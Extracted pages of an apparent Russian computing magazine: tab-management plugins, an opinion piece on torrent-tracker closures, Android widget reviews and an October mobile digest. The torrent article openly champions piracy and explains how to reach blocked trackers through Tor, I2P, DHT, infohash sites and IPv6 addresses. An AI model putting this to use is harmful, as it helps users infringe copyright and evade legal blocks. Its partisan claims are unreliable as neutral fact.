       В правой части размещается панель с текущими вкладками, а ос-
         новную часть занимают созданные тобой списки. Можно лег-
          ко перетаскивать вкладки в любой список, чтобы упорядочить их
         по темам, сайтам, времени открытия или любым другим удобным
         параметрам. Из минусов стоит отметить отсутствие поддержки ки-
          риллицы.
           Для Firefox есть интересный плагин под названием Tree Style
           Tab. Он перемещает список вкладок в отдельную колонку и отобра-
         жает их в виде дерева. Ты легко можешь создать кастомные ветки
         и заполнить их вкладками.





                                                                    Вид вкладок Tree Style Tab

        При помощи плагина OneTab для Chrome ты можешь спрятать все
          вкладки под одной кнопкой.





                                                                OneTab спрячет все закладки без остатка

         OneTab просто-напросто закрывает все табы и собирает ссыл-
          ки на отдельную вкладку. Из нее ты можешь заново открыть отло-
         женные таким образом страницы или убрать их из списка, если они
         больше не нужны. Если хочешь, чтобы при повторном открытии ка-
          кой-то пункт не удалялся, зажми Ctrl (Cmd на Маке). Если не хочешь
          сметать все разом, можешь перетаскивать вкладки на значок пла-
          гина по одной.
            Как видишь, есть разные способы наводить порядок. Глав-
         ное — чтобы он был.
СЦЕНА
ПОД ФЛАГОМ
ВЕСЕЛОГО
РОДЖЕРА





ПОЧЕМУ ЗАКРЫВАЮТ ТОРРЕНТ-ТРЕКЕРЫ
И ЧТО ПРИДЕТ ИМ НА СМЕНУ





ИНТРО
Борьба с пиратством в интернете приняла самый мас-
штабный характер за всю историю. В этом году был аре-
стован  владелец  крупнейшего  поисковика  торрентов
KickassTorrents и закрыты десятки ресурсов помельче. Пра-
вообладатели стали активнее топить пиратов, а последние                                                                                            84ckf1r3
находят все более изощренные способы оставаться на пла-      84ckf1r3@gmail.com
 ву. Чем же уникален новый виток этого извечного противо-
стояния щита и меча?

ПИРАТЫ ДРЕВНИЕ И СОВРЕМЕННЫЕ
Софтверное пиратство появилось вместе с первыми программами, которые
можно было запускать на других компьютерах. Это может прозвучать пара-
доксально, однако именно благодаря пиратству в советское, а затем и по-
стперестроечное время появилось современное поколение отечественных
ИТ-специалистов широкого профиля. Как в России, так и в бывших союзных
республиках достать любой мыслимый софт можно было бесплатно или поч-
ти даром. Сколько он стоил — было абсолютно неважно. Новые операционки,
офисные пакеты, профессиональные средства разработки, чертежные и ди-
зайнерские программы — все это было на файловых эхах в FidoNet, передава-
лось на дискетах и продавалось на дисках, а позже появилось и в интернете.
   Благодаря пиратству мы получили колоссальное преимущество, поскольку
с детства могли изучать любые программы безо всяких вложений. Некоторые
из них на Западе были только у сотрудников крупных компаний — ведь про-
фессиональный софт оценивался в сотни и даже тысячи долларов за лицен-
зию! Денег стоили даже такие вещи, как компиляторы. Нам же было легко экс-
периментировать хоть с CorelDraw, хоть c ArchiCAD или Visual Studio. Никакого
вынужденного освоения нелюбимых программ. Целые подборки софта стоили
чуть дороже диска, на который были записаны. В «цивилизованных странах»
пользователям приходится довольствоваться тем, что купили на свои кров-
ные, — что тогда, что сейчас.
   Борьба с пиратством в России всегда была формаль-
ной. Время от времени устраивались показательные
суды и публичные порки — лишь бы поддерживать иллю-
зию наведения порядка. Тогда зарубежные партнеры бу-
дут иметь с нами дело, а в рынок развивающейся страны
продолжат поступать иностранные инвестиции. Открывая
                                                WARNING
свои представительства в России, международные ком-
пании прекрасно понимали все риски. Однако они ста-      Статья носит исследо-
рались работать на перспективу, попутно выбивая круп-      вательский характер.
                                                                 Она лишь отражает субъ-ные госконтракты не самым честным образом. Сначала                                                                          ективную точку зрения
они относились к нам покровительственно — как к пере-      на распространение
воспитываемым дикарям, которые проиграли холодную    информации в интерне-
                                                                                  те и обеспечивает тех-войну. С годами им приходилось адаптироваться к рос-                                                                         ническую возможность
сийской действительности либо перебираться в другие                                                                          граждан реализовать
регионы.                                                               свои права, гаранти-
   Тем временем пиратство развивалось и поднима-      рованные статьей 29
                                                                              Конституции РФ.
лось на новый уровень, чему сильно способствовали ва-
резные сайты и особенно файлообменные сети. Вместе
с новым техническим уровнем произошел и качественный переход: пират-
ство перестало быть идеологией и мелким бизнесом, превратившись в круп-
ный источник теневых доходов. Пиратство не было лишь национальной чертой
и не могло существовать отдельно от других нелегальных форм извлечения
прибыли. Интересы многих криминальных групп очень тесно переплелись,
а самые крупные пираты постепенно начали легализоваться.
   Примерно с конца девяностых по заказу одних пиратов регулярно стали
устраиваться рейды на других — не имеющих влиятельного прикрытия. Появи-
лись изощренные схемы монетизации. Например, в «таблетки от жадности» ста-
ли добавлять трояны с целью формирования ботнетов и кражи данных. К тому
времени все уже привыкли к срабатываниям антивирусов на утилиты для аль-
тернативной регистрации программ. Писать привычное предупреждение «От-
ключите антивирус, файрвол, запустите от админа и встаньте в позу № 92» ста-
ло избыточным. Пользователи и так выполняли этот ритуал самозаражения.
   Вскоре генераторы ключей и кряки перестали быть бесплатными люби-
тельскими поделками. Основную часть начали регулярно писать целые группы,
воруя способы взлома новых программ уже друг у друга. Их даже стали про-
давать с оплатой через СМС, виртуальную валюту или хотя бы получая деньги
за принудительный показ рекламы на файлообменных хостингах. Часть ссылок
на варезных ресурсах стала фишинговой, да и в самих раздачах появилась со-
мнительная реклама. Одним словом, давно закончилась пиратская романтика,
началась жесткая конкурентная борьба.

Как реклама стала пиратской

Долгое время пиратская копия была единственным способом посмотреть
фильм без рекламы. Ее не только в обязательном порядке покажут по ТВ,
но и заставят смотреть в кинотеатре или на купленном диске. Реклама будет
крутиться несколько минут на оглушительной громкости без возможности пе-
ремотки штатными средствами. Поэтому очищенный рип был даже лучше ори-
гинала. Сейчас пираты освоили и эту нишу. «Присутствуют вставки голосовой
и текстовой рекламы» — такую надпись можно заметить на многих новых раз-
дачах. На практике это означает, что в самый неожиданный момент ты увидишь
(и услышишь) хвалебную оду в адрес какого-нибудь онлайнового казино, у ко-
торого теперь снова другой адрес. Прежний был заблокирован по решению
суда. Для пользователей это безобразие объясняется как вынужденная не-
обходимость. Любительский перевод фильма, создание и оформление раз-
дач требуют времени, а работа трекера — денег. На самом деле это говорит
о том, что теневые формы бизнеса сливаются друг с другом. Даже пираты хо-
тят, чтобы их работа оплачивалась, и отнюдь не по ставке МРОТ.



NAPSTER И GNUTELLA
Показательна история развития первых файлообменных сетей. Юридически
Napster сгубила официальная деятельность, а технически — централизованное
управление списками. Единый сервер содержал полный перечень как всех раз-
даваемых файлов, так и хранящих их хостов. Из-за этого группе Metallica было
легко надавить на основателей Napster и довести компанию до банкротства.
Конечно, единственным иском ее не закрыли, но громкое разбирательство
с известной группой привело к большим потерям. Позже на аукционе банкро-
тов Napster был выкуплен за внушительную сумму почти в два с половиной мил-
лиона долларов и превратился в раскрученный платный ресурс. Дело было во-
все не в защите авторских прав, а в борьбе за источники дохода. Это обычный
бизнес, в котором иск от Metallica стал способом избавления от конкурентов.
   Непрямым потомком Napster стала файлообменная сеть Gnutella. Она была
создана программистами  из  Nullsoft,  позднее покинувшими  компанию.
 Gnutella, в отличие от Napster, изначально была децентрализованной. Для по-
иска файлов был разработан универсальный протокол gPulp (general Purpose
Location Protocol). Его фактическое воплощение происходило разными спосо-
бами — вплоть до поиска файлов запросами через IRC. Релиз одноименного
клиентского приложения с открытым исходным кодом так и не состоялся, од-
нако методом реверс-инжиниринга код все же получили, а затем наплодили
два десятка форков под разные операционки.
   У каждого из них были свои интересные особенности, но поддержка боль-
шинства клиентов Gnutella сейчас прекращена. Активная разработка продол-
жается только для трех форков: gtk-gnutella, Shareaza и WireShare, ранее из-
вестного как LPE (LimeWire Pirate Edition).
   Хотя gtk-gnutella не считается популярной программой, многие идеи ее
разработчиков были воплощены в других клиентах файлообменных сетей.
Shareaza интересна своей всеядностью. Она позволяет качать сразу из не-
скольких P2P-сетей по разным протоколам, включая не только оригинальный
Gnutella, но и Gnutella2, eDonkey и BitTorrent. Также одним из самых продвину-
тых P2P-клиентов остается WireShare. Он доступен для Windows, Linux и Mac.
Фактически это переделанная версия LimeWire, из которой полностью удале-
на реклама, тулбары и бэкдоры. WireShare распространяется с открытым ис-
ходным кодом. С помощью этого клиента можно скачивать торренты, просма-
тривать файлы на доступных хостах, создавать закрытые раздачи «для своих»
и даже параллельно общаться.

КОРОЛЕВСТВО ЗАБЛОКИРОВАННЫХ ЗЕРКАЛ
По сути  BitTorrent — лишь один из протоколов файлообменных сетей,
но за счет некоторых особенностей он быстро стал самым популярным.
У BitTorrent сразу было то, что объединило варезные сайты и P2P-сети, — это
каталоги торрентов, отдельные сайты со списком раздач и удобным оформле-
нием. По сравнению со свалкой в DC-хабах и с непростыми попытками укро-
тить ослика eDonkey для пользователя на торрент-каталогах все выглядит
максимально привычно. Вбиваешь адрес сайта, ищешь, что нужно, и жмешь
«Скачать». Разница еще и в том, что на таких сайтах есть статистика, отзывы
и рейтинговая система.
   Доступность найденного в торрентах сразу видна, поскольку параллельно
с каталогом работает один или несколько трекеров, связывающих клиентов
друг с другом. Они формируют списки узлов, мониторят данные о количестве
скачанных частей, используемых клиентах и их настройках у всех участников
файлообмена. Вместо дохлой ссылки на очередной файлообменник трекером
передается файл .torrent, содержащий данные для загрузки искомого внеш-
ней программой со всех доступных узлов. При большом числе раздающих ска-
чивание идет максимально быстро, «без рекламы и СМС». Впрочем, рекламу
стали встраивать уже в сами клиентские приложения.
   Каталоги и трекеры способствовали успеху BitTorrent, но одновременно ста-
ли его самой уязвимой частью. Из-за них нарушался принцип децентрализа-
ции, а для правообладателей появлялись вполне определенные мишени: сай-
ты, которые можно заблокировать, и их владельцы, которых можно арестовать.
   Создатели торрент-каталогов пытались бороться с блокировками: частич-
но легализоваться удалось с помощью внедрения форм для жалоб правооб-
ладателей. Однако далеко не всех из них устраивало удаление раздач по за-
просу. Многим был нужен лишь повод для судебного иска. Поэтому другой
ответной мерой стало зеркалирование сайтов, так или иначе участвующих
в файлообмене. Когда по решению суда блокировали сайт в одном домене,
его клон продолжал работать в других.
   Такая тактика выживания помогала, но лишь отчасти. Крупнейший поиско-
вик торрентов — KAT (KickassTorrents) по запросу Минюста США этим летом
лишился сразу семи доменов. Он блокировался не только провайдерами раз-
ных стран, но даже сервисами Whois, Google, Twitter и чатом в Steam. Многие
ресурсы удаляли ссылки на KAT по требованию властей.





                            Когда не могут закрыть ресурс, закрывают его владельца

Второй по популярности торрент-ресурс — The Pirate Bay (TPB) был самым
крупным по числу зеркал в разных доменах. Однако даже его доменной гидре
в самый канун 2016 года отрубили сразу восемь голов. В ходе этой операции
регистраторами был создан уникальный прецедент: делегирование доменов
приостановили на неопределенное время. Фактически с такими доменами ни-
чего нельзя сделать. Они и не удалены, и не активны — эдакие полумертвые
домены Шредингера.
   Пока TPB работает более-менее стабильно только в домене .org. Это
не заслуга регистраторов в данном домене — просто на текущий момент так
сложилась ситуация. Другой известный каталог торрентов — rutor.org оказал-
ся заблокирован. Теперь он работает по новым адресам в доменах .info и .is.





                                                                        Rutor без .org

TOR ДЛЯ ТОРРЕНТ-КАТАЛОГОВ
Старые методы поддержания торрент-ресурсов на плаву перестают быть эф-
фективными, поэтому сейчас активно развиваются сразу два асимметричных
ответа: уход в даркнет и отказ от трекеров вообще. У The Pirate Bay давно поя-
вился свой адрес в Tor. Этому примеру последовали и другие трекеры, но воз-
никла новая проблема — специфика адресов. Ссылки вида *.onion обычный
браузер (и рядовой пользователь) не понимает. Поэтому для основной мас-
сы неискушенных потребителей контента придумали добавочные указатели.
Другая проблема заключается в том, что само имя представляет собой неза-
поминающийся набор символов. Его даже нельзя проверить на подлинность,
а вместо проверенного каталога легко попасть на фишинговый сайт — в дар-
кнете их немало.





                                                            Торренты в сети Tor

Степень анонимности в Tor также оставляет желать лучшего, а раскрыть себя
можно одним неосторожным движением. Поэтому, когда  KickassTorrents
не удалось заблокировать в очередной раз, Минюст США пошел на крайние
меры и... заблокировал владельца KAT. Артёма Ваулина задержали в Варша-
ве, предъявив обвинения в многократном нарушении авторских прав и отмы-
вании денег. Общая сумма ущерба оценивается в миллиард долларов. Часть
этого ущерба считается причиненной правообладателям из США, поскольку
формально действия происходили (в том числе) в штате Иллинойс. Число та-
ких «незаконно распространяемых произведений, охраняемых авторским пра-
вом» указано как «более десяти», а их общая розничная стоимость оценена
«больше чем в 2500 долларов».





                                     Выписка из постановления по делу Ваулина

Понятно, что лично Артём ничего не крал. На его сайте вообще не было самих
контрафактных копий, как и на любом другом каталоге торрентов. Этот театр
юридического абсурда был нужен только для того, чтобы можно было вменить
Ваулину нарушение федерального законодательства США и потребовать его
экстрадиции.





                         Обвинение Ваулина в отмывании денег через криптовалюту

В результате гражданин Украины был арестован в Польше за нарушение аме-
риканского закона. Международное взаимодействие? Нет, обычные двойные
стандарты на фоне игры в законность. Трудно представить, что гражданина
США арестуют в чужой стране за нарушение, к примеру, украинского закона.
Сумма ущерба тоже оценивается по интересной методике. Это количество
всех скачанных копий, помноженное на стоимость исходных релизов, если бы
их купили по установленной издателем цене. К примеру, ты скачал Core Impact
Pro и VxWorks. Стоимость только этих двух дистрибутивов составляет 240 ты-
сяч долларов. Сильно сомневаюсь, что ты бы купил их. Скорее всего, без пи-
ратской копии ты бы о них и не узнал. Каталогам торрентов впору самим вы-
ставлять счета за рекламу и услуги распределенного репозитория.

Tor не для файлообмена, или почему анонимности бывает
слишком много

Перемещение  в  даркнет  сайтов-трекеров и  поисковиков  торрент-фай-
лов — не то же самое, что передача самого трафика BitTorrent в Tor и I2P. Одно
дело — найти подпольную раздачу и тянуть ее уже через обычный интернет,
и совсем другое — пытаться заниматься файлообменом по зашифрованному
каналу. Мягко говоря, это не получится сделать быстро, да и остальные участ-
ники сети не обрадуются такой лавине трафика. Поэтому в отличие от поиска
анонимное скачивание и раздачу торрентов стоит использовать лишь в край-
нем случае.
   Многие торрент-трекеры и каталоги торрентов помогают своим посетите-
лям, описывая методы обхода блокировок, рекламируя сервисы VPN с бес-
платным тестовым периодом и показывая текущие параметры соединения.
Например, на главной странице extratorrent.cc автоматически проверяется те-
кущий IP-адрес посетителя.





                                       ExtraTorrent проверяет анонимность подключения



В поисках более надежной защиты файлообменные ресурсы перемещаются
в I2P — анонимную децентрализованную оверлейную сеть со сквозным шиф-
рованием трафика. Анонимная она потому, что в I2P нет привычных IP-адре-
сов. Каждый узел идентифицируется внутри сети по используемому им публич-
ному ключу шифрования. Децентрализованная она из-за отсутствия корневых
серверов и доверенных узлов. Оверлейная — поскольку работает поверх су-
ществующей инфраструктуры интернета без собственных физических каналов
(аналогично Tor или VPN). Сквозное шифрование полностью скрывает содер-
жимое передаваемых пакетов.





                                                                           DifTracker в I2P

Подробно особенности I2P уже разбирались в другой статье. Здесь же от-
мечу, что в последнее время в I2P перемещаются сайты для поддержки все-
возможных P2P-сетей, включая трекеры и каталоги торрентов. Например,
для сети eD2k и поиска файлов по распределенной хеш-таблице Kademlia
есть I2P-клиент iMule. Из популярных трекеров в даркнете можно выделить
RuTracker, DifTracker и Postman как обладающие солидным каталогом и удоб-
ным поиском.





                                                                  TrackerPostman

Как подключиться к I2P: краткое руководство

Устанавливаем Java Runtime Environment — без Amazon Asstitant и прочих
crapware.

1. Устанавливаем поддержку I2P. Если ставишь в Windows и хочешь автозапуск
   сервиса I2P в фоне, то отмечай чекбокс Windows Service.
2. Перезагружаем компьютер.
3. Используем ярлык Start I2P. На первый раз лучше выбрать вариант запуска
   с созданием окна — так легче увидеть ошибки. Например, мне пришлось
   вручную создать каталог %USERPROFILE%\AppData\Roaming\i2p\ — иначе
   сервису не удавалось начать ведение лог-файла.
4. Попадаем в консоль софтового маршрутизатора I2P, где видим подробную
   русскоязычную справку.
5. Делаем все дальнейшие настройки согласно руководству и пользуемся «не-
   видимым интернетом».





                                                          Начало работы с I2P

Для I2P есть и собственные торрент-клиенты. Один из них (I2PSnark) встроен
в программный маршрутизатор. Он отличается минималистичным дизайном,
но позволяет совершать с торрентами весь набор основных действий.





                                                                          I2PSnark


ТОРРЕНТЫ БЕЗ ТРЕКЕРОВ... И БЕЗ КАТАЛОГОВ
Если блокируют в первую очередь каталоги и трекеры, то нельзя ли обойтись
без них? Технически можно. Каталоги могут заменить IRC, Twitter, GitHub, пу-
бличные облака и что угодно еще — была бы возможность передать ссылку
и отыскать ее потом.
   После закрытия трекера все скачанные с него торренты продолжают до-
качиваться и раздаваться, пока у сидов не сменятся айпишники или настрой-
ки подключения. Если только функцию соединения пиров не возьмет на себя
другой трекер. К счастью, большинство раздач продублировано одновремен-
но на многих ресурсах. Вероятность, что их закроют все сразу, довольно мала.
   Функцию трекера сегодня успешно заменяют распределенная хеш-табли-
ца DHT и функция прямого обмена между пирами PEX. Обе технологии под-
держиваются современными торрент-клиентами, помогая сидам и личерам
не терять друг друга после блокировки трекера. Если же у первого сида (ав-
тора раздачи) есть статичный внешний айпишник, то с помощью DHT раздачу
вообще можно сделать бестрекерной.
   Проблема в том, что такой децентрализации противятся уже сами владель-
цы трекеров. С бестрекерными раздачами они теряют посетителей и прибыль
от рекламы. Поэтому в качестве компромисса был предложен механизм прину-
дительного отключения DHT и PEX в торрент-клиентах. Оно происходит всякий
раз, когда внутри торрент-файла обнаруживается ключ private, равный едини-
це. Именно из-за этого на многих трекерах запрещено использовать клиенты,
не поддерживающие обработку ключей private, например старые версии.
   Помимо технических способов поддержания файлообменных ресурсов,
ищутся и новые правовые методы. На TheTorrent.org поступили довольно хи-
тро, создав хранилку торрентов без поиска. Де-юре сайт не за что закрывать,
так как он не распространяет контрафакт. Никаких улик там найти невозможно
(во всяком случае — стороне обвинения и обычными способами). Нет даже
названий раздач. Зато ты всегда сможешь скопировать инфохеш от нужного
торрента и скачать файл по ссылке вида http://TheTorrent.org/<INFO_HASH_
IN_HEX>.torrent. Хеш торрента обычно публикуется в описаниях раздачи и мо-
жет быть найден в свойствах файла.





                                                  Хеш как хитрая ссылка

Еще один сайт трудно назвать каталогом или трекером, так как в нем нет раз-
дач, а число сидов всегда отображается нулевым. Torrents-Pro лишь акту-
ализирует ссылки на другие трекеры. С его помощью можно создать своео-
бразную цепочку загрузки: найти на нем нужную раздачу и выбрать из списка
thetorrent.org. Прямая ссылка на торрент с уже заполненным значением
хеша откроется на новой странице.

КОГДА ЗАКОНЧИТСЯ ШТОРМ
Поднятый правообладателями шторм добрался и до пиратской бухты, а в Рос-
сии пока не топят лишь те файлообменные ресурсы, которые не успели за-
метить или за которыми стоит кто-то из правительства. Например, советник
президента РФ по интернету Герман Клименко оказался владельцем тор-
рент-трекера torrnado.ru. Полагаю, что в остальном мире действует подобная
(может быть — менее явная) схема конкурентной борьбы с использованием
ресурсов власти.





                                           Трекер, одобренный советником президента

На волне блокировок и арестов все больше файлооб-
менных ресурсов уходит в скрытую часть интернета. По-
хоже, это устраивает всех участников противостояния.
Минюст США, Роскомнадзор и другие органы контроля
смогут рапортовать об успешной зачистке Сети от пи-
ратов. Давить их всерьез сейчас означает лишить народ
последних радостей. Обозленный обыватель, которо-     WWW
му нечего терять, — не самый лояльный к власти изби-
                                                                      FAQ по I2Pратель. После показательной зачистки правообладатели
в любом случае снизят убытки от распространения кон-    The Pirate Bay в сети Tor
трафакта — для многих он окажется недоступен. Пира-
                                                                           Альтернативныйты останутся на плаву, но шиковать пока не будут. На ка-
                                                                           интернет — подборка
кое-то время число посетителей упадет в десятки раз,                                                                        децентрализованных
поскольку не каждый освоит настройку Tor, I2P, поиск          сервисов
по хешам и другие премудрости. Зато увеличенный по-
рог вхождения оставит за бортом всех, кто не умеет ны-
рять, а лишь учится серфить.



Интересно, что для отечественной системы блокировок весь диапазон адре-
сов IPv6 оказывается чем-то вроде GrayNet. Это еще не глубокое подполье,
вроде Tor и I2P, но и не столь легко контролируемая классика. Банить Ро-
скомнадзор наловчился только по IPv4, в то время как адреса вроде http://
[2001:67c:28f8:7b:42df:833:9648:5d6d] спокойно открываются безо вся-
ких туннелей и прокси. Конечно, если у тебя самого включена поддержка IPv6.
MOBILE


ВЫПУСК #25.
ВИДЖЕТЫ
КАРМАННЫЙ                    Сегодня в выпуске: расши-
                   ряемый виджет, способ-
                   ный показывать инфор-
                  мацию практически обоСОФТ всем, виджеты часов и по-
                    годы в стиле HTC, Samsung
                    и Sony, а также два кон-
                      структора виджетов, кото-
                   рые позволят тебе проя-
                      вить фантазию.





DASHCLOCK
DashClock — это изначально информа-
ционный виджет для экрана блокировки
Android 4.2–4.4, со временем превратив-
шийся в обычный виджет. По умолчанию
DashClock показывает время, погоду, ко-
личество пропущенных звонков, тексто-
вых сообщений и писем, а также события
из календаря и эвенты будильника.
   Однако  перед  другими  подобными
виджетами  у DashClock есть огромное
преимущество:  его  функциональность
расширяема. В  маркете можно  найти
огромное количество плагинов, с помо-
щью которых DashClock можно  заста-
вить выводить на экран практически все
что угодно: процент заряда батареи, за-
груженность процессора, занятости па-
мяти, скорость скачивания данных, уве-
домления, сообщения WhatsApp, кнопки
управления плеером и многое другое.
   DashClock   написан   сотрудником
Google, бесплатен, открыт и не содер-
жит рекламы. Если бы не полное отсут-
ствие настроек отображения информации                  DashClock
и не явная ориентированность виджета                 Платформа:
на отображение информации на экране                     Android 4.2
блокировки, его бы можно было назвать                  Цена:
единственным виджетом, который только                    бесплатно
может понадобиться.



ZOOPER
Еще один «сборный» виджет, в этот раз
с полной свободой действий. Zooper по-
зволяет самостоятельно собрать из са-
мых разных графических элементов лю-
бой виджет на твой вкус, начиная от цвета
и размера и заканчивая поворотом вокруг
своей оси и растягиванием.
  По умолчанию в Zooper доступны не-
сколько преднастроенных  тем, которые
можно менять по своему вкусу, но нельзя
сохранять. Платная версия открывает воз-
можность сохранения настроек виджетов,
а также возможность устанавливать темы,
созданные другими людьми. Плюс отсут-
ствие рекламы и поддержка лаунчера Buzz.
   Сразу   предупредим,   что   Zooper
не для всех. Создание своего собствен-
ного  виджета —  задача  трудоемкая
и требующая понимания хотя бы базо-
вых принципов дизайна. С наскоку здесь
не разберешься, но, поковырявшись до-
статочно долго, можно создать шедевр.

                                                         Zooper
                                                     Платформа:
                                                                    Android 3.2
                                                       Цена:
                                                               бесплатно




AMBER WEATHER
В любой фирменной прошивке любого
производителя смартфонов в комплек-
те обязательно есть совмещенный вид-
жет погоды и часов. Первой моду на такие
виджеты ввела HTC со своими знамени-
тыми перекидными часами. Их начали
копировать все кому не лень, в том чис-
ле  разработчики  популярного  Beautiful
Widgets. В маркете также можно найти ко-
пии часов из прошивок Motorola, Samsung
и TouchWiz, но все они меркнут на фоне
Amber Weather.
  В отличие от многих других вижетов,
у Amber Weather есть огромная коллек-
ция тем с более чем сотней различных
вариантов отображения погоды и часов.
Здесь есть как собственные темы, так
и копии из других прошивок. Выбор про-
сто огромный.
  Плюс ко всему ты получишь весьма
качественное погодное приложение, со-
зданное в уже ставшем стандартом сти-
ле приложения «Погода» в iOS и «Yahoo
Weather». Недостаток только один: до-                Amber
статочно большое количество рекламы,                  Weather
встроенное в приложение. На самих вид-                 Платформа:
жетах она, разумеется, не отображается.                       Android 4.0
                                                       Цена:
                                                               бесплатно



BUZZ WIDGET
Еще  один  конструктор  виджетов.  От-
личается  более  удобной  и  интуитив-
но понятной системой редактирования,
более интересными и современными те-
мами в комплекте и отсутствием огра-
ничений (приложение не просто  бес-
платное, но и  открытое). Более  того,
у разработчиков виджета также есть соб-
ственный кастомизируемый лаунчер, по-
зволяющий   устанавливать  сторонние
темы, которых в Сети насчитывается уже
более 500 тысяч.





                                                         Buzz Widget
                                                     Платформа:
                                                                    Android 3.2
                                                       Цена:
                                                               бесплатно
MOBILE
МОБИЛЬНЫЙ ДАЙДЖЕСТ
 ОКТЯБРЯGOOGLE PIXEL, ANDROID 7.1
      И УНИВЕРСАЛЬНЫЙ ROOT ДЛЯ ВСЕХ
              СМАРТФОНОВ





                                           Евгений Зобнин
                                                   zobnin@gmail.com





Сегодня в выпуске: Google Pixel — несостоявшийся конку-
рент Apple iPhone, Android 7.1, не принесший практически
ничего нового, смерть Cyanogen OS и туманное будущее
CyanogenMod, новые инструменты дизайна интерфей-
са в стиле Material, сравнение Google Assistant и Siri, рас-
сказ о защищенном протоколе Signal и WhatsApp и до-
казательство абсолютной бесполезности большинства
Android-приложений для шифрования данных. Приятного
чтения.

СОБЫТИЯ
Главное событие октября — это, конечно же, выход на рынок смартфо-
на Google Pixel. Новый смартфон Google был представлен четвертого числа
 как новый виток развития мобильного направления Google. Это уже не Нексус,
который просто лицензировался у сторонних производителей, а смартфон,
полностью спроектированный Google и ориентированный не на разработчи-
 ков, а на широкий круг пользователей; своего рода затянувшийся ответ Apple
c ее iPhone, ее ценниками и подходом «симбиоз железа и софта, дополняю-
щих друг друга».





                                                                             Google
                                                                                           Pixel





Ответ, надо сказать, получился весьма противоречивый: в целом действитель-
но достойный аппарат, с отличными характеристиками, эргономикой, с плюш-
ками в виде быстрых обновлений и круглосуточной поддержки по телефону,
но уж слишком неоднозначный по дизайну и особенно цене. Многие обзорщи-
ки сошлись во мнении, что Pixel просто не стоит тех денег, которые за него
просят, и, кроме отличной камеры и официальной поддержки, Pixel больше ни-
чем не выделяется на фоне других топовых смартфонов.
    Pixel — единственный в данный момент смарт-
фон, работающий под управлением  Android  7.1.
Эта версия была представлена 11 октября в виде
Preview-сборок для Nexus 5X, Nexus 6P и Pixel C.
В новой версии появились шорткаты для иконок
приложений в стиле iOS 9 (долгое удержание паль-
ца на иконке откроет меню быстрых действий), под-
держка круглых иконок и другие небольшие улучше-
ния в пользовательском интерфейсе.
   Отличилась в октябре и компания Samsung, а точ-
нее продолжила отличаться в истории со взрыва-
ющимся Note 7. Оказалось, что новые, помеченные
 как Safe (безопасные) смартфоны с замененной ба-
тареей взрывались не хуже предыдущих. США и мно-
гие международные авиакомпании полностью за-
претили включать смартфон на борту самолета,                                                              App Shortcuts
а стоимость Samsung упала на 8%, что означает по-            в Android 7.1
терю около 17 миллиардов долларов.
   Так и не разобравшись с причиной возгорания, Samsung инициировала от-
зыв всех Galaxy Note 7, а чтобы хоть как-то удержать покупателей, предложила
не просто возврат стоимости аппарата, но и скидку в 100 долларов на покупку
другой модели. Что интересно, практически сразу после отзыва Note 7 китай-
ская компания Xiaomi анонсировала фаблет Mi Note 2 c абсолютно идентичным
изогнутым экраном на 5,7", как у Note 7. И конечно же, это сразу породило слухи
о сливе уже произведенной партии бесполезных экранов для Note 7 китайцам.
   Грустная новость для пользователей кастомных прошивок: компания
Cyanogen прекращает развитие Cyanogen OS — коммерческой версии
CyanogenMod и переключается на разработку так называемой модульной ОС,
что по сути означает превращение компании из разработчика полноценной
операционной системы в разработчика софта для Android. Для CyanogenMod
это вряд ли будет концом, но, скорее всего, теперь развитие прошивки замед-
 лится, а новая функциональность будет появляться реже.

РЕЛИЗЫ
У браузера Chrome появилась Canary-версия, включающая в себя все послед-
ние, но все еще нестабильные нововведения браузера. Это так называемый
 bleeding edge для самых смелых и отчаянных, тех, кому бета-версии кажутся
слишком стабильными и скучными.

ИНСТРУМЕНТЫ
 Material Design — набор новых инструментов для разработчиков приложений
в стиле Material Design: Gallery — платформа для обмена концептами дизайна
с историей версий (своего рода GitHub для дизайнеров), Stage и Remixer — ин-
струменты прототипирования, позволяющие сделать макет интерфейса и про-
тестировать, как его элементы работают (включая анимацию).

 Global Android Device Directory — всеобъемлющий каталог Android-смартфо-
 нов, рассортированный на основе популярности в отдельных странах и во
всем мире. Кроме стандартных «Модель» и «Версия Android», каталог включает
в себя такие данные, как средняя задержка ответа (пинг) в мобильных и Wi-Fi-
сетях и даже процент сбоев приложений.

Drammer — универсальный эксплоит, позволяющий получить root-доступ
на многих Android-смартфонах с помощью уязвимости Rowhammer (pdf). По-
следняя опасна тем, что является исключительно «железной» проблемой
оперативной памяти и не может быть устранена с помощью обновления.
Видеодемонстрация.





ПОСМОТРЕТЬ
Samsung’s Explosion-Proof Note 7 Return Packaging — как выглядит огнеупор-
ная коробка для возврата Samsung Galaxy Note 7. Смартфон кладется в пакет
из огнеупорного пластика, который помещается в коробку, еще в одну коробку
и еще в одну.

Background Optimizations (Android Development Patterns S3 Ep 14) — о том, как пи-
сать эффективные работающие в фоне приложения для Android.

Google Assistant vs Siri! — сравнение качества работы Google Assistant и Siri.

ПОЧИТАТЬ
Root for Pixel (XL) / SuperSU v2.78 SR2 — разработчик Chainfire, известный бла-
годаря системе управления root-полномочиями SuperSU, а также приложени-
ям FlashFire, Recently и CF.lumen, рассказывает, как он реализовал поддержку
SuperSU для Google Pixel.
   Чтобы приложения могли получить доступ root в системе, должно быть
как минимум два компонента: бинарный файл su, в Linux-системах используе-
мый для выполнения команд с правами root, и приложение для обработки за-
просов на root-доступ и вывода соответствующего уведомления на экран.
   Ранние приложения для рутинга размещали эти компоненты в разделе
system: бинарник su в /system/bin (или /system/xbin), а приложение (Superuser.
apk или SuperSU.apk) — в /system/app. Но была в этом подходе проблема: об-
новление прошивки либо стирало их, либо просто не устанавливалось (если
речь об инкрементальном обновлении). Тогда Chainfire решил размещать эти
компоненты в RAM-диске, который загружается в оперативную память сразу
после ядра. Такой подход абсолютно не мешал обновлениям и отлично рабо-
тал до выхода Android 7.0 и смартфонов Pixel.
   Оказалось, что RAM-диск в них используется только при загрузке в recovery,
тогда как содержимое «системного» RAM-диска находится в разделе system.
Причем сам раздел system подключается как корень, а не к каталогу /system.
Чтобы решить эту проблему, пришлось создать утилиту, которая формирует
RAM-диск заново, модифицирует ядро, чтобы оно загружало RAM-диск. Бо-
лее того, чтобы она правильно отработала, сама утилита должна загружаться
из RAM-диска.

How to compile DVIA for iOS 10 and Xcode 8 for mobile app security testing —
как скомпилировать и установить Damn Vulnerable iOS App (DVIA) для iOS 10.
DVIA, или «Чертовски уязвимое приложение», разработал Пратик Гианчанда-
ни (Prateek Gianchandani) специально как тестовый полигон для пентестеров
и всех, кто интересуется безопасностью и хаком мобильных приложений.

Password Storage In Sensitive Apps — рассказ о том, какую защиту на самом
